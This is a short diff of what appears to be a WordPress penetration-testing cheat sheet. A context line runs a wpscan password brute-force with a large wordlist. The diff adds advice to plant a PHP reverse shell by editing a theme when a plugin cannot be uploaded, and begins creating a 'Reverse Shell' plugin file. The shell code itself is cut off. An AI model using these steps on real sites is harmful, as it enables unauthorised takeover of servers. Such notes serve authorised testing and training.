@@ -225,9 +225,11 @@ wpscan --rua -e u --url <url> -P /usr/share/seclists/Passwords/xato-net-10-milli
 ```
 
 If admin permissions are granted, upload a plugin with a reverse shell.
+If unable to upload a plugin, edit the theme with a PHP reverse shell.
 
 ```shell
-cat rs/rs.php
+mkdir rs
+cat > rs/rs.php
 <?php
 /*
 Plugin Name: Reverse Shell
